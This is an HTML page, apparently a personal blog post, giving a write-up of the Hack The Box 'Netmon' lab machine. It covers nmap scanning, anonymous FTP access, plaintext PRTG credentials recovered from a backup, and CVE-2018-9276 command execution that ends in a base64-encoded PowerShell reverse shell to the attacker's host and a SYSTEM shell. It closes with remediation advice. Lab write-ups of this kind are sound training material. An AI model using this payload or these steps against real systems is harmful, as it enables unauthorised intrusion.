@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+            </div>
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Netmon WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Netmon/Netmon_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <h1>1. Introduction</h1>
+                    <p><strong>Objective</strong>: Assess the security of the target system and document any vulnerabilities found, providing recommendations to mitigate risks.</p>
+                    <p><strong>Target IP Address</strong>: `10.129.230.176`</p>
+                    <h1>2. Summary</h1>
+                    <p><strong>Overall Status</strong>: Several services were identified running, including a web server with a vulnerable tool (PRTG Network Monitor) and an FTP service with anonymous access enabled. Through these weaknesses, access to the system with administrator privileges was gained.</p>
+                    <p><Strong>Key findings</Strong>:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>FTP</strong>: Anonymous access enabled, allowing access to the entire C drive.</li>
+                            <li><strong>PRTG Network Monitor</strong>: Outdated version vulnerable to <strong>RCE (CVE-2018-9276)</strong>.</li>
+                            <li><strong>Discovered Credentials</strong>: Plaintext passwords found in a backup configuration file.</li>
+                        </ul>
+                    </div>
+                    <h1>3. Methodology</h1>
+                    <p>The assessment was carried out following a typical penetration testing structure:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Enumeration</strong>: Identification of services and open ports by scanning with Nmap.</li>
+                            <li><strong>Service Analysis</strong>: Enumeration of specific services (FTP and PRTG).</li>
+                            <li><strong>Exploitation</strong>: Initial compromise through discovered vulnerabilities.</li>
+                            <li><strong>Post-Exploitation</strong>: Privilege escalation and evidence collection.</li>
+                        </ul>
+                    </div>
+                    <h1>4. Technical details</h1>
+                    <h2>4.1 Enumeration</h2>
+                    <p>We start the enumeration phase using nmap for discovering open ports:</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn 10.129.230.176                           
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 10:53 EST
+Initiating SYN Stealth Scan at 10:53
+Scanning 10.129.230.176 [1000 ports]
+Discovered open port 139/tcp on 10.129.230.176
+Discovered open port 445/tcp on 10.129.230.176
+Discovered open port 80/tcp on 10.129.230.176
+Discovered open port 21/tcp on 10.129.230.176
+Discovered open port 135/tcp on 10.129.230.176
+Increasing send delay for 10.129.230.176 from 0 to 5 due to 99 out of 329 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 10 to 20 due to 11 out of 15 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 20 to 40 due to 11 out of 13 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 40 to 80 due to 11 out of 12 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 80 to 160 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 160 to 320 due to 133 out of 441 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 10.129.230.176 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
+Completed SYN Stealth Scan at 10:57, 205.54s elapsed (1000 total ports)
+Nmap scan report for 10.129.230.176
+Host is up (0.037s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+80/tcp  open  http
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 205.60 seconds
+           Raw packets sent: 1664 (73.216KB) | Rcvd: 1097 (43.900KB)
+                        </pre>
+                    </div>
+                    <p>The following open ports are identified:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>21/tcp</strong>: FTP</li>
+                            <li><strong>80/tcp</strong>: HTTP</li>
+                            <li><strong>135/tcp</strong>: msrpc</li>
+                            <li><strong>139/tcp</strong>: netBIOS-SSN</li>
+                            <li><strong>445/tcp</strong>: Microsoft-DS</li>
+                        </ul>
+                    </div>
+                    <p>Now we discover the versions of the the services:</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn -sCV -p 21,80,135,139,445 10.129.230.176
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 10:58 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating SYN Stealth Scan at 10:58
+Scanning 10.129.230.176 [5 ports]
+Discovered open port 445/tcp on 10.129.230.176
+Discovered open port 21/tcp on 10.129.230.176
+Discovered open port 80/tcp on 10.129.230.176
+Discovered open port 135/tcp on 10.129.230.176
+Discovered open port 139/tcp on 10.129.230.176
+Completed SYN Stealth Scan at 10:58, 0.05s elapsed (5 total ports)
+Initiating Service scan at 10:58
+Scanning 5 services on 10.129.230.176
+Completed Service scan at 10:58, 6.18s elapsed (5 services on 1 host)
+NSE: Script scanning 10.129.230.176.
+Initiating NSE at 10:58
+NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+Completed NSE at 10:58, 8.29s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.28s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Nmap scan report for 10.129.230.176
+Host is up (0.038s latency).
+
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_11-10-23  09:20AM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -16s, deviation: 0s, median: -17s
+| smb2-time: 
+|   date: 2024-11-23T15:58:25
+|_  start_date: 2024-11-23T15:52:11
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
+           Raw packets sent: 5 (220B) | Rcvd: 5 (220B)
+                        </pre>
+                    </div>
+                    <p><strong>Service discovery (Nmap -sCV)</strong></p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>FTP (Microsoft FTP Service)</strong>: Supports anonymous authentication. Fully accessible directory structure.</li>
+                            <li><strong>HTTP (PRTG Network Monitor)</strong>: PRTG Network Monitor version 18.1.37.13946.</li>
+                            <li><strong>SMB (Microsoft-DS)</strong>: Unrequired message signing, increasing the risk of manipulation.</strong></li>
+                        </ul>
+                    </div>
+                    <h2>4.2 Exploitation</h2>
+                    <h3>FTP (Anonymous Access)</h3>
+                    <p>We authenticate anonymously to the FTP service with the credentials <i>'anonymous:anonymous'</i>:</p>
+                    <div class="console-code">
+                        <pre>
+$ ftp 10.129.230.176
+Connected to 10.129.230.176.
+220 Microsoft FTP Service
+Name (10.129.230.176:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp>    
+                        </pre>
+                    </div>
+                    <p><strong>Navigation</strong>:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>In the `Public/Desktop` directory, files related to PRTG Network Monitor were identified.</li>
+                        </ul>
+                    </div>
+                    <div class="console-code">
+                        <pre>
+ftp> cd Users
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50025|)
+150 Opening ASCII mode data connection.
+02-25-19  10:44PM       &lt;DIR&gt;          Administrator
+01-15-24  10:03AM       &lt;DIR&gt;          Public
+226 Transfer complete.
+ftp> cd Public
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50027|)
+150 Opening ASCII mode data connection.
+01-15-24  10:03AM       &lt;DIR&gt;          Desktop
+02-03-19  07:05AM       &lt;DIR&gt;          Documents
+07-16-16  08:18AM       &lt;DIR&gt;          Downloads
+07-16-16  08:18AM       &lt;DIR&gt;          Music
+07-16-16  08:18AM       &lt;DIR&gt;          Pictures
+07-16-16  08:18AM       &lt;DIR&gt;          Videos
+226 Transfer complete.
+ftp> cd Desktop
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50030|)
+150 Opening ASCII mode data connection.
+02-02-19  11:18PM                 1195 PRTG Enterprise Console.lnk
+02-02-19  11:18PM                 1160 PRTG Network Monitor.lnk
+11-23-24  10:52AM                   34 user.txt
+226 Transfer complete.
+ftp> 
+                        </pre>
+                    </div>
+                    <h3>Web enumeration</h3>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>PRTG Network Monitor</strong> is a network monitoring tool developed by Paessler. It is used to proactively monitor and manage network infrastructures, services, and devices.</li>
+                        </ul>
+                    </div>
+                    <p>We can confirm that "<strong>PRTG Network Monitor</strong>" is installed on the target machine's web service:</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/1.png" alt="">
+                        <p class="caption">Web service home page</p>
+                    </div>
+                    <p>When we enter the website, we have a login and at the moment we do not have credentials or anything that could be useful to us.</p>
+                    <p>We search for information about the installation of this service on the internet and we find three interestings paths of the default installation. What interests us in this case, since we have the hability to read the files on the target machine through FTP, is the data directory path where we can find possible credentials.</p>
+                    <p>https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/2.png" alt="">
+                        <img src="../images/Posts/Netmon/3.png" alt="">
+                    </div>
+                    <p>With this information, we return to the FTP service.</p>
+                    <p>At first glance we cannot see the "%programdata%" folder, since it is a hidden folder by default, but we can still enter and navigate through it.</p>
+                    <div class="console-code">
+                        <pre>
+ftp> dir
+229 Entering Extended Passive Mode (|||50258|)
+150 Opening ASCII mode data connection.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+02-03-19  07:08AM       &lt;DIR&gt;          Users
+11-10-23  09:20AM       &lt;DIR&gt;          Windows
+226 Transfer complete.
+ftp> cd programdata
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50260|)
+150 Opening ASCII mode data connection.
+12-15-21  09:40AM       &lt;DIR&gt;          Corefig
+02-02-19  11:15PM       &lt;DIR&gt;          Licenses
+11-20-16  09:36PM       &lt;DIR&gt;          Microsoft
+02-02-19  11:18PM       &lt;DIR&gt;          Paessler
+02-03-19  07:05AM       &lt;DIR&gt;          regid.1991-06.com.microsoft
+07-16-16  08:18AM       &lt;DIR&gt;          SoftwareDistribution
+02-02-19  11:15PM       &lt;DIR&gt;          TEMP
+11-20-16  09:19PM       &lt;DIR&gt;          USOPrivate
+11-20-16  09:19PM       &lt;DIR&gt;          USOShared
+02-25-19  09:56PM       &lt;DIR&gt;          VMware
+226 Transfer complete.
+ftp> cd Paessler
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50262|)
+125 Data connection already open; Transfer starting.
+11-23-24  11:34AM       &lt;DIR&gt;          PRTG Network Monitor
+226 Transfer complete.
+ftp> cd PRTG\ Network\ Monitor
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||50264|)
+150 Opening ASCII mode data connection.
+11-23-24  11:34AM       &lt;DIR&gt;          Configuration Auto-Backups
+11-23-24  11:02AM       &lt;DIR&gt;          Log Database
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (Debug)
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (Sensors)
+02-02-19  11:18PM       &lt;DIR&gt;          Logs (System)
+11-23-24  11:02AM       &lt;DIR&gt;          Logs (Web Server)
+11-23-24  11:02AM       &lt;DIR&gt;          Monitoring Database
+02-25-19  09:54PM              1189697 PRTG Configuration.dat
+02-25-19  09:54PM              1189697 PRTG Configuration.old
+07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+11-23-24  11:34AM              1673141 PRTG Graph Data Cache.dat
+02-25-19  10:00PM       &lt;DIR&gt;          Report PDFs
+02-02-19  11:18PM       &lt;DIR&gt;          System Information Database
+02-02-19  11:40PM       &lt;DIR&gt;          Ticket Database
+02-02-19  11:18PM       &lt;DIR&gt;          ToDo Database
+226 Transfer complete.
+ftp> 
+                        </pre>
+                    </div>
+                    <p>At first glance, what catches our attention is an unusual file called `<i>PRTG Configuration.old.bak</i>` which was deprecated and last modified on <strong>07-14-18</strong> and updated to the file `<i>PRTG Configuration.old</i>` dated <strong>02-25-19</strong>. These files appear to store a backup copy of the PRTG configuration.</p>
+                    <p>We download the file `<i>PRTG Configuration.old.bak</i>` to analyze it better:</p>
+                    <div class="console-code">
+                        <pre>
+ftp> get PRTG\ Configuration.old.bak
+local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
+229 Entering Extended Passive Mode (|||50348|)
+150 Opening ASCII mode data connection.
+100% |*****************************************************| 1126 KiB  1.48 MiB/s  00:00 ETA
+226 Transfer complete.
+1153755 bytes received in 00:00 (1.48 MiB/s)
+ftp> 
+                        </pre>
+                    </div>
+                    <div class="console-code">
+                        <pre>
+$ ls -al 
+total 1108
+drwxr-xr-x 2 root root    4096 Nov 24 01:35  .
+drwxr-xr-x 4 kali kali    4096 Nov 22 15:53  ..
+-rw-r--r-- 1 root root 1124497 Jul 14  2018 'PRTG Configuration.old.bak'
+
+$ wc --lines 'PRTG Configuration.old.bak'
+29258 PRTG Configuration.old.bak
+                        </pre>
+                    </div>
+                    <p>The file is large, it has data in xml format and has 29258 lines, so we have to filter by keywords.</p>
+                    <p>Using the command below we remove spaces and tabs, show only the content between the word "<strong>password</strong>" and sort the selected lines alphabetically and remove duplicates.</p>
+                    <div class="console-code">
+                        <pre>
+$ cat 'PRTG Configuration.old.bak' | tr -d ' \t' | sed -n '/password/, /password/p' | sort -u
+
+&lt;/cell&gt;
+&lt;cellcol="0"crypt="PRTG"&gt;
+&lt;cellcol="1"crypt="PRTG"&gt;
+&lt;/dbpassword&gt;
+&lt;dbpassword&gt;
+&lt;encrypted/&gt;
+&lt;/esxpassword&gt;
+&lt;esxpassword&gt;
+&lt;/flags&gt;
+&lt;flags&gt;
+&lt;inherited/&gt;
+&lt;/linuxloginpassword&gt;
+&lt;linuxloginpassword&gt;
+M24VKFRECBEGN3ZQNGSET723GFIPVHYX
+&lt;/password&gt;
+&lt;password&gt;
+PDWXMOPZT43U2GKGR3YCBILXDMLAUZVBN27KGBOPKXRQ====
+&lt;/proxypassword&gt;
+&lt;proxypassword&gt;
+PrTg@dmin2018
+&lt;!--User:prtgadmin--&gt;
+/windowsloginpassword&gt;
+&lt;windowsloginpassword&gt;
+                        </pre>
+                    </div>
+                    <p>By filtering the data we found possible credentials for the PRTG website.</p>
+                    <h3>Credentials discovered</h3>
+                    <p>A configuration file (`PRTG Configuration.old.bak`) stored old passwords in plain text:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>User</strong>: prtgadmin</li>
+                            <li><strong>Password</strong>: PrTg@dmin2018</li>
+                        </ul>
+                    </div>
+                    <p>We try to authenticate with the previously discovered credentials:</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/4.png" alt="">
+                    </div>
+                    <p><strong>Strategy</strong>:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>
+                                As the password belonged to a previous backup, a pattern-based password (`PrTg@dmin2019`) was tried, achieving successful authentication.
+                            </li>
+                        </ul>
+                    </div>
+                    <p>We noticed that the username and password don't work, but we remember that we extracted these credentials from an old backup dated <strong>07-14-18</strong>, and as we saw the file was last updated on <strong>02-25-19</strong>, so the credentials could have been changed. We try the password "PrTg@dmin2019" to see if we're lucky.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/5.png" alt="">
+                    </div>
+                    <p>It works and we are logged in as Administrator.</p>
+                    
+                    <h3>Privilege escalation</h3>
+                    <p>The PRTG service was vulnerable to CVE-2018-9276, which allows RCE by triggering notifications with a malicious payload.</p>
+                    <p>Steps taken:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>Setting up a new notification.</li>
+                            <li>Running a `ping` command to our machine to validate the vulnerability.</li>
+                            <li>Running a malicious payload to gain SYSTEM access.</li>
+                        </ul>
+                    </div>
+                    <h3>Foothold</h3>
+                    <p>We quickly realize that the installed version is outdated, which can lead to potential vulnerabilities.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/6.png" alt="">
+                    </div>
+                    <p>A Google search for the vulnerabilities yields a CVE for versions &lt;18.1.39 (CVE-2018-9276). According to this article, an RCE can be achieved by enabling notifications. Let's try to exploit it. The software runs by default as SYSTEM.</p>
+                    <p>We clic on <strong>setup&gt;Account Settings&gt;notifications</strong>.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/7.png" alt="">
+                    </div>
+                    <p>We added a new notification:</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/8.png" alt="">
+                    </div>
+                    <p>First we will test if we can get an RCE. We listen for icmp traces on our machine:</p>
+                    <div class="console-code">
+                        <pre>
+$ tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+                        </pre>
+                    </div>
+                    <p>We leave the initial fields by default and go down to "<strong>Execute Program</strong>".</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/9.png" alt="">
+                    </div>
+                    <p>We choose `<strong>Demo exe notification-outfile.ps1</strong>` and write the command to test in <strong>Parameter</strong>. We save the configuration by clicking on <strong>save</strong>.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/10.png" alt="">
+                    </div>
+                    <p>We select the small blue box and click on the bell to test the notification:</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/11.png" alt="">
+                        <img src="../images/Posts/Netmon/12.png" alt="">
+                    </div>
+                    <p>We can confirm that we have obtained command execution, since we received the icmp trace as proof.</p>
+                    <div class="console-code">
+                        <pre>
+$ tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+02:37:57.245933 IP 10.129.230.176 > 10.10.14.85: ICMP echo request, id 1, seq 28209, length 40
+02:37:57.245949 IP 10.10.14.85 > 10.129.230.176: ICMP echo reply, id 1, seq 28209, length 40
+
+                        </pre>
+                    </div>
+                    <h3>Trying to get a reverse shell</h3>
+                    <p>We listen with netcat on port 4444</p>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+                        </pre>
+                    </div>
+                    <p>We use the revshells.com page to generate a reverse shell in powershell and encoded in base64</p>
+                    <div class="console-code">
+                        <pre>
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0AL
+gBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4A
+OAA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQ
+AcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AH
+wAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiA
+HkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7
+ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQB
+zAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbg
+BnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAI
+AAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIA
+YQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4
+AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG
+4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhA
+GMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABz
+AGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA
+7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+                        </pre>
+                    </div>
+                    <p>We configure the previous notification again and modify the <strong>Parameter</strong> field with the generated command:</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Netmon/13.png" alt="">
+                    </div>
+                    <p>We execute the notification and obtain access to the system as a user with maximum privileges.</p>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.85] from (UNKNOWN) [10.129.230.176] 51774
+whoami
+nt authority\system
+PS C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::a9f2:5c39:5841:f033
+   Link-local IPv6 Address . . . . . : fe80::a9f2:5c39:5841:f033%3
+   IPv4 Address. . . . . . . . . . . : 10.129.230.176
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%3
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+PS C:\Windows\system32> 
+                        </pre>
+                    </div>
+                    <h1>5. Recommendations</h1>
+                    <p><strong>FTP</strong>: Disable anonymous access if not needed and enforce strict permission policies on FTP directories.</p>
+                    <p><strong>SMB</strong>: Enable SMB message signing.</p>
+                    <p><strong>PRTG Network Monitor</strong>: </p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Application-level input validation</strong>: Implement server-side input validation for all form fields, using whitelists of allowed characters instead of blacklists.</li>
+                            <li><strong>Disabling unnecessary functionality</strong>: Limit the use of special characters in fields that do not require them and disable non-essential PRTG service features.</li>
+                            <li><strong>Updating software and applying patches</strong>: Contact the software vendor (in this case, PRTG) to check if a patch exists to fix this vulnerability. Install it immediately if available.</li>
+                            <li><strong>Implementing detection and response (EDR) mechanisms</strong>: Configure security alerts to detect patterns of suspicious activity, such as unusual command execution or unauthorized access.</li>
+                            <li><strong>Regular security testing</strong>: Perform regular security audits on infrastructure and penetration testing on web applications to proactively identify vulnerabilities.</li>
+                            <li><strong>Isolating the PRTG server</strong>: Isolate the server on a segmented network to limit its ability to compromise other assets in the event of a successful exploit.</li>
+                        </ul>
+                    </div>
+                    <h1>6. Conclusion</h1>
+                    <p>This analysis reveals poor system configuration, with outdated critical services and insecure configurations. Full access to the system could be used to compromise other systems on the internal network.</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Issue Summary</strong>: A critical vulnerability has been identified in the PRTG service that allows arbitrary command execution via a poorly validated field. This weakness compromises the integrity, confidentiality, and availability of the system.</li>
+                            <li><strong>Summary Impact</strong>: Exploitation could grant an attacker full control over the affected server, enabling unauthorized access to sensitive information and facilitating subsequent attacks within the network.</li>
+                            <li><strong>Value of Recommendations</strong>: Implementing the proposed recommendations not only mitigates this vulnerability, but also strengthens the overall security posture of the system. This reduces the risk of future exploits and improves trust in the infrastructure.</li>
+                            <li><strong>Call to Action</strong>: It is imperative that corrective measures be prioritized and executed with urgency, starting with input validation, server isolation, and software update. Collaboration between IT and security teams will be key to ensuring effective mitigation.</li>
+                            
+                        </ul>
+                    </div>
+                    <!-- Imágenes
+                    <div class="writeup-image">
+                        <img src="../images/nothing_to_see_here.png" alt="Resultado del escaneo Nmap">
+                        <p class="caption">Figura 1: Resultado de escaneo Nmap en el host objetivo</p>
+                    </div>
+                    -->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
